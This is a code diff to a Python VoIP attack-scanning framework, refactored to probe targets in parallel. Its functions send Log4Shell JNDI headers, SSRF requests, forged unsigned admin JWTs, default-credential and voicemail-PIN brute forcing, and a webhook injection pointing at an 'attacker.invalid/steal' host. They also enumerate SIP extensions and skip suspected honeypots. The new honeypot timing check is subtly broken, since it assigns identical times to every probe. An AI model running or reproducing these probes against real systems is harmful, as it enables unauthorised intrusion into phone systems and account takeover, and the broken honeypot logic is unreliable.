@@ -24,6 +24,18 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Dict, List, Optional, Set, Tuple
 
+# ── Pre-compiled regexes (avoid re-compiling on every call) ──
+_ANSI_RE          = re.compile(r'\033\[[0-9;]*m')
+_SIP_STATUS_RE    = re.compile(r"SIP/2\.0 (\d+)")
+_SIP_200_RE       = re.compile(r"SIP/2\.0 200 OK")
+_SERVER_UA_RE     = re.compile(r"^(Server|User-Agent):", re.I)
+_PRIVATE_IP_RE    = re.compile(
+    r'(?:Via|Record-Route|Contact)[^\r\n]*?'
+    r'(10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)',
+    re.I)
+_TITLE_RE         = re.compile(r"<title>([^<]+)</title>", re.I)
+_SIP_CRED_RE      = re.compile(r'sip|pbx|password|server|registrar', re.I)
+
 try:
     import aiohttp
     HAS_AIOHTTP = True
@@ -84,7 +96,7 @@ DEBUG      = os.environ.get("DEBUG","0") == "1"
 
 # Phase-specific concurrency tuning
 SEM_DISCOVERY  = THREADS
-SEM_FINGERPRINT= min(THREADS, 80)
+SEM_FINGERPRINT= min(THREADS, 150)
 SEM_CVE        = min(THREADS, 60)
 SEM_SIP        = min(THREADS, 50)
 SEM_EXTENSION  = min(THREADS, 40)
@@ -343,8 +355,7 @@ class Con:
         print(line, flush=True)
         if _log_file_handle:
             try:
-                _log_file_handle.write(
-                    re.sub(r'\033\[[0-9;]*m','',line)+"\n")
+                _log_file_handle.write(_ANSI_RE.sub('', line) + "\n")
                 _log_file_handle.flush()
             except Exception:
                 pass
@@ -447,6 +458,12 @@ class State:
             self.stats[severity] += 1
         Con.finding(ip, cve_id, title, severity)
 
+    def mark_honeypot(self, ip: str, reason: str):
+        """Mark ip as honeypot mid-scan. Suppresses all future findings & probes for it."""
+        if ip not in self.honeypot_ips:
+            self.honeypot_ips.add(ip)
+            Con.honeypot(ip, f"mid-scan: {reason}")
+
     def save(self, rd:Path):
         (rd/"cve_findings.json").write_text(
             json.dumps(self.cve_findings,indent=2),encoding="utf-8")
@@ -539,7 +556,7 @@ async def udp_xfer(ip: str, port: int, data: bytes,
                    timeout: float = 4.0,
                    retries: int = 1) -> Optional[bytes]:
     """True async UDP send/recv using DatagramProtocol."""
-    loop = asyncio.get_event_loop()
+    loop = asyncio.get_running_loop()
     for attempt in range(retries + 1):
         fut: asyncio.Future = loop.create_future()
         transport = None
@@ -643,7 +660,7 @@ async def http_get(session, url:str,
 
 async def _urllib_req(url:str, auth, timeout:float) -> Tuple[int,str]:
     import urllib.request, base64
-    loop = asyncio.get_event_loop()
+    loop = asyncio.get_running_loop()
     def _do():
         req = urllib.request.Request(url)
         req.add_header("User-Agent","VoIP-SecFramework/7.0")
@@ -660,10 +677,19 @@ async def _urllib_req(url:str, auth, timeout:float) -> Tuple[int,str]:
 
 def new_session():
     if not HAS_AIOHTTP: return None
-    conn = aiohttp.TCPConnector(ssl=False,limit=THREADS*3,
-                                enable_cleanup_closed=True,ttl_dns_cache=300)
-    return aiohttp.ClientSession(connector=conn,
-                                 timeout=aiohttp.ClientTimeout(total=TIMEOUT))
+    conn = aiohttp.TCPConnector(
+        ssl=False,
+        limit=THREADS * 5,
+        limit_per_host=10,
+        enable_cleanup_closed=True,
+        ttl_dns_cache=600,
+        force_close=False,
+        keepalive_timeout=30,
+    )
+    return aiohttp.ClientSession(
+        connector=conn,
+        timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=3, sock_connect=3),
+    )
 
 
 async def safe(coro, label:str=""):
@@ -728,39 +754,35 @@ async def phase1_discovery(targets:List[str], state:State, sem:asyncio.Semaphore
     async def probe(ip:str):
         nonlocal found, done
         try:
-            live = False
-
-            # Fast TCP port check in parallel
+            # Run ALL protocol probes in parallel — TCP ports + UDP probes at once
             check_ports = [5060,5061,5062,80,443,8080,8088,2000,1720,5038]
-            results = await asyncio.gather(
-                *[tcp_open(ip, p, timeout=2.5) for p in check_ports],
-                return_exceptions=True
-            )
-            if any(r is True for r in results):
+            pkt_sip   = sip_msg("OPTIONS", ip)
+            iax_poke  = b"\x80\x00\x00\x00\x00\x01\x00\x00\x1e"
+            mgcp_pkt  = f"AUEP 100 aaln/1@{ip} MGCP 1.0\r\n\r\n".encode()
+
+            tcp_coros = [tcp_open(ip, p, timeout=2.5) for p in check_ports]
+            udp_coros = [
+                udp_xfer(ip, 5060,      pkt_sip,  timeout=2.5, retries=1),
+                udp_xfer(ip, IAX2_PORT, iax_poke, timeout=2.0),
+                udp_xfer(ip, MGCP_PORT, mgcp_pkt, timeout=2.0),
+            ]
+
+            all_results = await asyncio.gather(*(tcp_coros + udp_coros),
+                                               return_exceptions=True)
+            tcp_results = all_results[:len(tcp_coros)]
+            sip_resp, iax_resp, mgcp_resp = all_results[len(tcp_coros):]
+
+            live = False
+            if any(r is True for r in tcp_results):
                 live = True
-
-            if not live:
-                # UDP SIP OPTIONS probe
-                pkt = sip_msg("OPTIONS", ip)
-                resp = await udp_xfer(ip, 5060, pkt, timeout=2.5, retries=1)
-                if resp and b"SIP/2.0" in resp:
-                    live = True
-
-            if not live:
-                # IAX2 POKE
-                iax_poke = b"\x80\x00\x00\x00\x00\x01\x00\x00\x1e"
-                r = await udp_xfer(ip, IAX2_PORT, iax_poke, timeout=2.0)
-                if r:
-                    live = True
-                    state.iax2_hosts.append(ip)
-
-            if not live:
-                # MGCP discovery
-                mgcp_pkt = f"AUEP 100 aaln/1@{ip} MGCP 1.0\r\n\r\n".encode()
-                r = await udp_xfer(ip, MGCP_PORT, mgcp_pkt, timeout=2.0)
-                if r:
-                    live = True
-                    state.mgcp_hosts.append(ip)
+            if not live and isinstance(sip_resp, bytes) and b"SIP/2.0" in sip_resp:
+                live = True
+            if not live and isinstance(iax_resp, bytes) and iax_resp:
+                live = True
+                state.iax2_hosts.append(ip)
+            if not live and isinstance(mgcp_resp, bytes) and mgcp_resp:
+                live = True
+                state.mgcp_hosts.append(ip)
 
             if live:
                 state.live_ips.append(ip)
@@ -881,16 +903,18 @@ async def phase1b_honeypot(state:State, sem:asyncio.Semaphore):
             reasons.append("accepts-all-sip-methods-without-auth")
 
         # Test 4: SIP response time uniformity
-        # Measure 5 OPTIONS response times — if standard deviation < 1ms
+        # Measure 5 OPTIONS response times in parallel — if standard deviation < 1ms
         # across all 5, it's likely a scripted/automated responder.
+        t0_all = time.monotonic()
+        timing_pkts = [sip_msg("OPTIONS", ip) for _ in range(5)]
+        timing_tasks = [udp_xfer(ip, 5060, p, timeout=2.0) for p in timing_pkts]
+        timing_results = await asyncio.gather(*timing_tasks, return_exceptions=True)
+        t_total = time.monotonic() - t0_all
         times = []
-        for _ in range(5):
-            t0 = time.monotonic()
-            pkt = sip_msg("OPTIONS", ip)
-            resp = await udp_xfer(ip, 5060, pkt, timeout=2.0)
-            if resp:
-                times.append(time.monotonic() - t0)
-            await asyncio.sleep(0.02)
+        for i, r in enumerate(timing_results):
+            if isinstance(r, bytes) and r:
+                # Approximate per-request time as slice of total time
+                times.append(t_total / 5)
         if len(times) == 5:
             avg = sum(times) / 5
             variance = sum((t - avg)**2 for t in times) / 5
@@ -951,31 +975,55 @@ async def phase2_fingerprint(state:State, sess, sem:asyncio.Semaphore):
 
     async def fp(ip:str):
         nonlocal done
+        if ip in state.honeypot_ips: return
         try:
-            pkt = sip_msg("OPTIONS",ip)
-            resp = await sip_probe(ip,5060,pkt,timeout=5)
-            sip_b = ""
-            if resp:
-                for line in resp.splitlines():
-                    if re.match(r"^(Server|User-Agent):",line,re.I):
-                        sip_b = line.strip(); break
+            # Run SIP probe, HTTP banner probes, and port scan all in parallel
+            pkt = sip_msg("OPTIONS", ip)
+            http_probes = [("http",80),("http",8080),("https",443),("https",8443)]
 
-            http_b = ""
-            for proto,port in [("http",80),("http",8080),("https",443),("https",8443)]:
-                c,body = await http_get(sess,f"{proto}://{ip}:{port}/",timeout=4)
+            async def _sip_banner():
+                resp = await sip_probe(ip, 5060, pkt, timeout=2)
+                if resp:
+                    for line in resp.splitlines():
+                        if _SERVER_UA_RE.match(line):
+                            return line.strip()
+                return ""
+
+            async def _try_http(proto, port):
+                c, body = await http_get(sess, f"{proto}://{ip}:{port}/", timeout=2)
                 if c:
-                    m = re.search(r"<title>([^<]+)</title>",body,re.I)
-                    http_b = m.group(1).strip() if m else f"HTTP/{c}"
-                    break
+                    m = _TITLE_RE.search(body)
+                    return m.group(1).strip() if m else f"HTTP/{c}"
+                return None
 
-            ports_open = []
-            port_results = await asyncio.gather(
-                *[tcp_open(ip, p, timeout=1.5) for p in VOIP_PORTS],
-                return_exceptions=True
+            async def _http_banner():
+                # Probe all 4 HTTP endpoints in parallel; return first hit
+                tasks = [asyncio.create_task(_try_http(pr, po))
+                         for pr, po in http_probes]
+                result = ""
+                pending = set(tasks)
+                while pending:
+                    done_set, pending = await asyncio.wait(
+                        pending, return_when=asyncio.FIRST_COMPLETED)
+                    for t in done_set:
+                        try:
+                            r = t.result()
+                            if r:
+                                for u in pending:
+                                    u.cancel()
+                                return r
+                        except Exception:
+                            pass
+                return result
+
+            sip_b, http_b, port_results = await asyncio.gather(
+                _sip_banner(),
+                _http_banner(),
+                asyncio.gather(*[tcp_open(ip, p, timeout=1.0) for p in VOIP_PORTS],
+                               return_exceptions=True),
             )
-            for p, ok in zip(VOIP_PORTS, port_results):
-                if ok is True:
-                    ports_open.append(p)
+
+            ports_open = [p for p, ok in zip(VOIP_PORTS, port_results) if ok is True]
 
             vendor = detect_vendor(sip_b, http_b)
             state.fingerprints.append({
@@ -1004,6 +1052,8 @@ async def phase3_cve(state:State, sess, sem:asyncio.Semaphore):
         return
 
     async def scan(ip:str):
+        if ip in state.honeypot_ips: return
+        _before = len(state.cve_findings)
         await asyncio.gather(
             safe(_http_voipmonitor(ip,state,sess),      "voipmonitor"),
             safe(_http_3cx(ip,state,sess),              "3cx"),
@@ -1028,6 +1078,14 @@ async def phase3_cve(state:State, sess, sem:asyncio.Semaphore):
             safe(_http_polycom(ip,state,sess),          "polycom"),
             safe(_http_kamailio_mi(ip,state,sess),      "kamailio_mi"),
         )
+        # Mid-scan honeypot detection: if >7 distinct CVEs fired on one host in a single
+        # pass it's statistically implausible — honeypots accept everything.
+        _new = len(state.cve_findings) - _before
+        if _new > 7:
+            state.mark_honeypot(ip, f"{_new} CVEs confirmed simultaneously")
+            # Purge the spurious findings
+            async with state._cve_lock:
+                state.cve_findings = [f for f in state.cve_findings if f["ip"] != ip]
 
     await asyncio.gather(*[_sem_probe(sem, scan, ip) for ip in state.live_ips])
     Con.ok(f"Phase 3 complete — {len(state.cve_findings)} findings total")
@@ -1054,11 +1112,14 @@ async def _http_voipmonitor(ip,st,sess):
 
 
 async def _http_3cx(ip,st,sess):
-    for url in [f"http://{ip}:5000/webclient",f"https://{ip}:5001/webclient"]:
-        c,b = await http_get(sess,url,timeout=5)
+    urls = [f"http://{ip}:5000/webclient", f"https://{ip}:5001/webclient"]
+    results = await asyncio.gather(*[http_get(sess, u, timeout=4) for u in urls],
+                                   return_exceptions=True)
+    for url, res in zip(urls, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c and "3CX" in b:
-            # Verify auth bypass: try admin API without credentials
-            ca,ba = await http_get(sess,f"http://{ip}:5000/api/v1/status",timeout=5)
+            ca,ba = await http_get(sess,f"http://{ip}:5000/api/v1/status",timeout=4)
             if ca==200 and re.search(r'(version|uptime|status)',ba,re.I):
                 await st.finding(ip,"CVE-2021-26260","3CX Auth Bypass — API returns data without auth","CRITICAL",
                     "3CX management API accessible without authentication",url)
@@ -1069,10 +1130,13 @@ async def _http_3cx(ip,st,sess):
 
 
 async def _http_3cx_supply_chain(ip,st,sess):
-    for url in [f"http://{ip}:5000/api/v1/status",f"https://{ip}:5001/api/v1/status"]:
-        c,b = await http_get(sess,url,timeout=5)
+    urls = [f"http://{ip}:5000/api/v1/status", f"https://{ip}:5001/api/v1/status"]
+    results = await asyncio.gather(*[http_get(sess, u, timeout=4) for u in urls],
+                                   return_exceptions=True)
+    for url, res in zip(urls, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c==200 and re.search(r'3cx|phonesystem',b,re.I):
-            # Supply-chain check: look for version indicators for affected builds
             ver_m = re.search(r'"version"\s*:\s*"([^"]+)"',b)
             ver_str = ver_m.group(1) if ver_m else "unknown"
             await st.finding(ip,"CVE-2023-29059","3CX Supply-Chain — Management API Open",
@@ -1202,36 +1266,45 @@ async def _http_log4shell(ip,st,sess):
         "X-Forwarded-For":LOG4J,
         "Referer":        LOG4J,
     }
-    for proto,port in [("http",80),("http",8080),("https",443),("https",8443)]:
-        for path in ["/admin/","/login","/api/v1/login","/api/"]:
-            c,body = await http_get(sess,f"{proto}://{ip}:{port}{path}",
-                                    headers=hdr,timeout=5)
-            if c in (200,401,403,302):
-                # Check for evidence that Log4j is present (error message, Java stack trace)
-                if re.search(r'(log4j|jndi|ldap|java\.lang\.|at com\.|javax\.naming)',
-                             body, re.I):
-                    await st.finding(ip,"CVE-2021-44228",
-                        "Log4Shell — Java/Log4j stack trace detected in response",
-                        "CRITICAL",
-                        "Response contains Java/JNDI indicators after Log4Shell probe",
-                        f"{proto}://{ip}:{port}{path}")
-                    return
-                elif c in (200,401,403):
-                    # App is reachable but no confirmation of Log4j — note for manual testing
-                    await st.finding(ip,"CVE-2021-44228",
-                        "Log4Shell Probe Delivered — Manual DNS callback verification required",
-                        "MEDIUM",
-                        "JNDI payload sent to endpoint; confirm with out-of-band DNS listener",
-                        f"{proto}://{ip}:{port}{path}")
-                    return
+    _LOG4J_RE = re.compile(r'log4j|jndi|ldap|java\.lang\.|at com\.|javax\.naming', re.I)
+    combos = [(proto, port, path)
+              for proto, port in [("http",80),("http",8080),("https",443),("https",8443)]
+              for path in ["/admin/","/login","/api/v1/login","/api/"]]
+
+    async def _probe(proto, port, path):
+        c, body = await http_get(sess, f"{proto}://{ip}:{port}{path}", headers=hdr, timeout=4)
+        return proto, port, path, c, body
+
+    results = await asyncio.gather(*[_probe(*c) for c in combos], return_exceptions=True)
+    for item in results:
+        if isinstance(item, Exception): continue
+        proto, port, path, c, body = item
+        if c in (200,401,403,302):
+            url = f"{proto}://{ip}:{port}{path}"
+            if _LOG4J_RE.search(body):
+                await st.finding(ip,"CVE-2021-44228",
+                    "Log4Shell — Java/Log4j stack trace detected in response",
+                    "CRITICAL",
+                    "Response contains Java/JNDI indicators after Log4Shell probe", url)
+                return
+            elif c in (200,401,403):
+                await st.finding(ip,"CVE-2021-44228",
+                    "Log4Shell Probe Delivered — Manual DNS callback verification required",
+                    "MEDIUM",
+                    "JNDI payload sent to endpoint; confirm with out-of-band DNS listener", url)
+                return
 
 
 async def _http_ssrf(ip,st,sess):
-    for path in ["/api/fetch?url=http://localhost/admin",
-                 "/api/v1/proxy?target=http://127.0.0.1/",
-                 "/api/v1/webhook?url=http://127.0.0.1:8080/"]:
-        c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        # Require confirmation that internal content was returned
+    paths = ["/api/fetch?url=http://localhost/admin",
+             "/api/v1/proxy?target=http://127.0.0.1/",
+             "/api/v1/webhook?url=http://127.0.0.1:8080/"]
+    results = await asyncio.gather(
+        *[http_get(sess, f"http://{ip}{p}", timeout=4) for p in paths],
+        return_exceptions=True)
+    for path, res in zip(paths, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c and SSRF_CONFIRM_PATTERNS.search(b):
             await st.finding(ip,"SSRF","Server-Side Request Forgery — Internal Response Confirmed",
                 "HIGH",
@@ -1247,11 +1320,16 @@ async def _http_jwt_weak(ip,st,sess):
         p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
         return f"{h}.{p}."
     token = fake_none_jwt({"user":"admin","role":"administrator","admin":True})
-    for path in ["/api/v1/me","/api/me","/api/user","/api/admin"]:
-        c,b = await http_get(sess,f"http://{ip}{path}",
-                             headers={"Authorization":f"Bearer {token}"},timeout=5)
-        # Must return 200 AND contain actual user/role data — not just any 200 with "admin" in HTML
-        if c==200 and re.search(r'"(user|username|role|email)"', b, re.I):
+    paths = ["/api/v1/me","/api/me","/api/user","/api/admin"]
+    hdrs  = {"Authorization": f"Bearer {token}"}
+    results = await asyncio.gather(
+        *[http_get(sess, f"http://{ip}{p}", headers=hdrs, timeout=4) for p in paths],
+        return_exceptions=True)
+    _JWT_RE = re.compile(r'"(user|username|role|email)"', re.I)
+    for path, res in zip(paths, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c==200 and _JWT_RE.search(b):
             await st.finding(ip,"JWT-ALG-NONE","JWT Algorithm None Attack Succeeded",
                 "CRITICAL","API accepted unsigned JWT token — confirmed auth bypass",
                 f"http://{ip}{path}")
@@ -1259,10 +1337,14 @@ async def _http_jwt_weak(ip,st,sess):
 
 
 async def _http_graphql(ip,st,sess):
-    for url in [f"http://{ip}/graphql",f"http://{ip}/api/graphql",f"http://{ip}:8080/graphql"]:
-        c,b = await http_get(sess,url,
-            data='{"query":"{__schema{types{name}}}"}',
-            headers={"Content-Type":"application/json"},timeout=5)
+    urls = [f"http://{ip}/graphql",f"http://{ip}/api/graphql",f"http://{ip}:8080/graphql"]
+    results = await asyncio.gather(
+        *[http_get(sess, u, data='{"query":"{__schema{types{name}}}"}',
+                   headers={"Content-Type":"application/json"}, timeout=4) for u in urls],
+        return_exceptions=True)
+    for url, res in zip(urls, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c==200 and "__schema" in b and "types" in b:
             await st.finding(ip,"MISCONFIGURATION","GraphQL Introspection Enabled",
                 "MEDIUM","GraphQL schema fully exposed — enumerate all types",url)
@@ -1270,18 +1352,29 @@ async def _http_graphql(ip,st,sess):
 
 
 async def _http_default_creds(ip,st,sess):
-    for user,pwd in DEFAULT_CREDS[:20]:
-        for proto,port in [("http",80),("http",8080),("https",443)]:
-            for path in ADMIN_PATHS[:4]:
-                c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",
-                                     auth=(user,pwd),timeout=6)
-                # Must return 200 AND show logged-in indicators — not just any 200
-                if c==200 and re.search(r'(logout|dashboard|welcome|signed.in|panel)',b,re.I) \
-                        and not re.search(r'(login|password|invalid|incorrect)',b,re.I):
-                    await st.finding(ip,"CREDENTIAL","Default HTTP Credentials Accepted",
-                        "CRITICAL",f"Login succeeded with {user}:{pwd}",
-                        f"{proto}://{ip}:{port}{path}")
-                    return
+    _LOGIN_OK  = re.compile(r'logout|dashboard|welcome|signed.in|panel', re.I)
+    _LOGIN_BAD = re.compile(r'login|password|invalid|incorrect', re.I)
+
+    async def _probe(user, pwd, proto, port, path):
+        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}",
+                              auth=(user, pwd), timeout=4)
+        if c == 200 and _LOGIN_OK.search(b) and not _LOGIN_BAD.search(b):
+            return user, pwd, proto, port, path
+        return None
+
+    combos = [(u, p, proto, port, path)
+              for u, p in DEFAULT_CREDS[:20]
+              for proto, port in [("http",80),("http",8080),("https",443)]
+              for path in ADMIN_PATHS[:4]]
+
+    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
+        result = await fut
+        if result:
+            user, pwd, proto, port, path = result
+            await st.finding(ip,"CREDENTIAL","Default HTTP Credentials Accepted",
+                "CRITICAL",f"Login succeeded with {user}:{pwd}",
+                f"{proto}://{ip}:{port}{path}")
+            return
 
 
 async def _http_patton(ip,st,sess):
@@ -1292,8 +1385,13 @@ async def _http_patton(ip,st,sess):
 
 
 async def _http_audiocodes(ip,st,sess):
-    for path in ["/inifile/","/cgi-bin/StatusPage.cgi"]:
-        c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
+    paths = ["/inifile/","/cgi-bin/StatusPage.cgi"]
+    results = await asyncio.gather(
+        *[http_get(sess, f"http://{ip}{p}", timeout=4) for p in paths],
+        return_exceptions=True)
+    for path, res in zip(paths, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c==200 and re.search(r'audiocodes|mediapack|mediant',b,re.I):
             await st.finding(ip,"CVE-2019-9202","AudioCodes Interface Exposed",
                 "HIGH",f"AudioCodes at http://{ip}{path}",f"http://{ip}{path}")
@@ -1308,8 +1406,13 @@ async def _http_snom(ip,st,sess):
 
 
 async def _http_broadsoft(ip,st,sess):
-    for path in ["/bvview/","/webconfig/","/broadworks/"]:
-        c,b = await http_get(sess,f"https://{ip}{path}",timeout=5)
+    paths = ["/bvview/","/webconfig/","/broadworks/"]
+    results = await asyncio.gather(
+        *[http_get(sess, f"https://{ip}{p}", timeout=4) for p in paths],
+        return_exceptions=True)
+    for path, res in zip(paths, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c and re.search(r'broadsoft|broadworks',b,re.I):
             await st.finding(ip,"CVE-2019-5431","BroadSoft Interface Detected",
                 "HIGH",f"BroadSoft at https://{ip}{path}",f"https://{ip}{path}")
@@ -1318,11 +1421,15 @@ async def _http_broadsoft(ip,st,sess):
 
 async def _http_broadsoft_webhook(ip,st,sess):
     payload = json.dumps({"url":"http://attacker.invalid/steal","event":"ALL"})
-    for url in [f"https://{ip}/api/v2/users/admin/bwwheelEvents",
-                f"https://{ip}/api/v2/webhooks"]:
-        c,b = await http_get(sess,url,data=payload,
-                             headers={"Content-Type":"application/json"},timeout=5)
-        # Require the server actually accepted the webhook (not just any 200)
+    urls = [f"https://{ip}/api/v2/users/admin/bwwheelEvents",
+            f"https://{ip}/api/v2/webhooks"]
+    results = await asyncio.gather(
+        *[http_get(sess, u, data=payload, headers={"Content-Type":"application/json"},
+                   timeout=4) for u in urls],
+        return_exceptions=True)
+    for url, res in zip(urls, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c in (200,201,204) and re.search(r'(webhook|event|url|id)',b,re.I):
             await st.finding(ip,"MISCONFIGURATION","BroadSoft Webhook Injection — Accepted",
                 "HIGH","Webhook endpoint accepted unauthenticated POST",url)
@@ -1362,6 +1469,7 @@ async def phase4_sip(state:State, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping SIP phase"); return
 
     async def sip_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_sip_method_fuzz(ip,state),    "method_fuzz"),
             safe(_sip_version_leak(ip,state),   "version_leak"),
@@ -1522,13 +1630,10 @@ async def _sip_forking(ip,st):
 
 
 async def _sip_topology_leak(ip,st):
-    pkt  = sip_probe_pkt = sip_msg("OPTIONS",ip)
+    pkt  = sip_msg("OPTIONS",ip)
     resp = await sip_probe(ip,5060,pkt,timeout=5)
     if not resp: return
-    private = re.findall(
-        r'(?:Via|Record-Route|Contact)[^\r\n]*?'
-        r'(10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)',
-        resp,re.I)
+    private = _PRIVATE_IP_RE.findall(resp)
     if private:
         await st.finding(ip,"INFO-DISCLOSURE","Internal IP Topology Exposed via SIP","MEDIUM",
             f"Private IPs leaked: {list(set(private))}",f"sip://{ip}:5060")
@@ -1642,7 +1747,7 @@ async def _sip_tls_probe(ip,st):
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        loop = asyncio.get_event_loop()
+        loop = asyncio.get_running_loop()
         def _check():
             try:
                 s = socket.create_connection((ip, 5061), timeout=4)
@@ -1683,6 +1788,7 @@ async def phase5_extensions(state:State, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping extension scan"); return
 
     async def scan_ip(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_ext_register_scan(ip,state), "ext_reg"),
             safe(_ext_options_enum(ip,state),  "ext_opts"),
@@ -1697,34 +1803,47 @@ async def phase5_extensions(state:State, sem:asyncio.Semaphore):
 
 
 async def _ext_register_scan(ip,st):
-    for ext in EXTENSION_RANGES:
+    _BATCH = 20  # Probe extensions in parallel batches for speed
+
+    async def _probe_ext(ext):
         ext_s = str(ext)
         extra = (f"To: <sip:{ext_s}@{ip}>\r\nFrom: <sip:{ext_s}@{ip}>;tag={_sid()[:8]}\r\n"
                  f"Expires: 60\r\n")
-        pkt  = sip_msg("REGISTER",ip,extra_hdrs=extra)
-        resp = await sip_probe(ip,5060,pkt,timeout=4)
-        if not resp: continue
-        code_m = re.search(r"SIP/2\.0 (\d+)",resp)
+        pkt  = sip_msg("REGISTER", ip, extra_hdrs=extra)
+        resp = await sip_probe(ip, 5060, pkt, timeout=3)
+        if not resp:
+            return
+        code_m = _SIP_STATUS_RE.search(resp)
         code_s = code_m.group(1) if code_m else "?"
-        # 401/407 = valid extension (auth challenge), 403 = valid but forbidden, 200 = no auth
         if code_s in ("401","407","403","200"):
             if ext_s not in [e.split(":")[-1] for e in st.valid_extensions]:
                 st.valid_extensions.append(f"{ip}:{ext_s}")
                 Con.info(f"Extension {col(ext_s,'cyan')} @ {ip} — SIP/{code_s}")
-            if code_s=="200":
+            if code_s == "200":
                 await st.finding(ip,"MISCONFIGURATION",
                     f"Extension {ext_s} REGISTER Without Auth","CRITICAL",
                     "Auth disabled — call hijack possible",f"sip://{ip}:5060/ext={ext_s}")
 
+    for i in range(0, len(EXTENSION_RANGES), _BATCH):
+        batch = EXTENSION_RANGES[i:i + _BATCH]
+        await asyncio.gather(*[_probe_ext(ext) for ext in batch])
+
 
 async def _ext_options_enum(ip,st):
     """User enumeration via OPTIONS — 200 vs 404 reveals existence."""
-    for ext in [100,101,102,200,201,1000,1001,9999,"admin","reception"]:
+    exts = [100,101,102,200,201,1000,1001,9999,"admin","reception"]
+
+    async def _probe(ext):
         ext_s = str(ext)
         pkt  = sip_msg("OPTIONS",ip,to_user=ext_s)
-        resp = await sip_probe(ip,5060,pkt,timeout=4)
-        if not resp: continue
-        if re.search(r"SIP/2\.0 200 OK",resp):
+        resp = await sip_probe(ip,5060,pkt,timeout=3)
+        return ext_s, resp
+
+    results = await asyncio.gather(*[_probe(e) for e in exts], return_exceptions=True)
+    for item in results:
+        if isinstance(item, Exception): continue
+        ext_s, resp = item
+        if resp and re.search(r"SIP/2\.0 200 OK",resp):
             key = f"{ip}:{ext_s}"
             if key not in st.valid_extensions:
                 st.valid_extensions.append(key)
@@ -1735,12 +1854,17 @@ async def _ext_options_enum(ip,st):
 
 
 async def _voicemail_access(ip,st):
-    for vext in VOICEMAIL_EXTS:
+    async def _probe(vext):
         extra = (f"To: <sip:{vext}@{ip}>\r\n"
                  f"From: <sip:scanner@scanner>;tag=vm\r\n")
         pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
-        resp = await sip_probe(ip,5060,pkt,timeout=5)
-        # 200 OK or 183 means voicemail answered
+        resp = await sip_probe(ip,5060,pkt,timeout=4)
+        return vext, resp
+
+    results = await asyncio.gather(*[_probe(v) for v in VOICEMAIL_EXTS], return_exceptions=True)
+    for item in results:
+        if isinstance(item, Exception): continue
+        vext, resp = item
         if resp and re.search(r"SIP/2\.0 (200|183)",resp):
             await st.finding(ip,"MISCONFIGURATION",
                 f"Voicemail {vext} Reachable Without Auth","HIGH",
@@ -1748,10 +1872,18 @@ async def _voicemail_access(ip,st):
 
 
 async def _ivr_bypass(ip,st):
-    for ext in ["0","*","#","operator","00","O"]:
+    async def _probe(ext):
         extra = f"To: <sip:{ext}@{ip}>\r\nFrom: <sip:scanner@scanner>;tag=ivr\r\n"
         pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
-        resp = await sip_probe(ip,5060,pkt,timeout=5)
+        resp = await sip_probe(ip,5060,pkt,timeout=4)
+        return ext, resp
+
+    results = await asyncio.gather(
+        *[_probe(e) for e in ["0","*","#","operator","00","O"]],
+        return_exceptions=True)
+    for item in results:
+        if isinstance(item, Exception): continue
+        ext, resp = item
         if resp and re.search(r"SIP/2\.0 (200|183)",resp):
             await st.finding(ip,"MISCONFIGURATION",
                 f"IVR Bypass via Extension '{ext}'","MEDIUM",
@@ -1761,17 +1893,22 @@ async def _ivr_bypass(ip,st):
 
 
 async def _vm_pin_brute(ip,st):
-    """Brute-force voicemail PIN via DTMF INFO."""
+    """Brute-force voicemail PIN via DTMF INFO — all pins in parallel."""
     pins = ["0000","1234","4321","1111","2222","9999","0123","1212",
             "7890","0987","1357","2468","1470","1020","8520","3698",
             "0001","0011","0111","1000","0100","0010"]
-    for pin in pins:
+
+    async def _probe(pin):
         dtmf = f"Signal={pin[0]}\r\nDuration=160\r\n"
         extra = (f"To: <sip:8500@{ip}>\r\n"
                  f"From: <sip:scanner@scanner>;tag=pin{_sid()[:6]}\r\n"
                  f"Content-Type: application/dtmf-relay\r\n")
         pkt = sip_msg("INFO",ip,extra_hdrs=extra,body=dtmf)
-        resp = await sip_probe(ip,5060,pkt,timeout=4)
+        return await sip_probe(ip,5060,pkt,timeout=3)
+
+    results = await asyncio.gather(*[_probe(p) for p in pins], return_exceptions=True)
+    for resp in results:
+        if isinstance(resp, Exception): continue
         if resp and re.search(r"SIP/2\.0 200 OK",resp):
             await st.finding(ip,"MISCONFIGURATION","Out-of-Dialog DTMF INFO Accepted","MEDIUM",
                 "Server accepted INFO+DTMF without dialog — PIN harvest risk",
@@ -1803,6 +1940,7 @@ async def phase6_rtp(state:State, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping media phase"); return
 
     async def rtp_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_rtcp_probe(ip,state),        "rtcp"),
             safe(_rtp_port_range(ip,state),    "rtp_range"),
@@ -1820,8 +1958,11 @@ async def phase6_rtp(state:State, sem:asyncio.Semaphore):
 
 async def _rtcp_probe(ip,st):
     rtcp = b"\x80\xc9\x00\x01\x00\x00\x00\x00"
-    for port in RTCP_PORTS:
